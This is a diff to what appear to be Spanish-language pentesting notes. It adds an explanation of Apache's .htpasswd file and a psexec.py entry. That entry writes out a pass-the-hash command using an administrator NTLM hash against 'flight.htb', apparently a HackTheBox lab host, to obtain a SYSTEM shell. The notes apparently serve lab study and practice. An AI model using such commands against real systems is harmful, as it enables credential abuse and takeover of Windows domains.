@@ -1099,7 +1099,10 @@ echo -n "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb" | wc 
 
 ## APACHE
 
+> El archivo .htpasswd es donde se guardan los usuarios y sus hashes/contraseñas cifradas para Basic Auth en Apache.
+
 Las rutas de apache que generalmente se utilizan son:
+
 
 ```
 /etc/apache2/sites-enabled/
@@ -2434,6 +2437,12 @@ chmod g+rw archivo
 ```
 
 ## psexec.py 
+
+Ojo un usuario Domain Admid tambien es administrador local de los equipos por eso puede hacer psexec y ejecutar comandos:
+
+```
+rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
+```
 
 Esta herrameinta sirve si tienes un usuario en el grupo Administrators y regresa una shell con permisos de Authority System
 
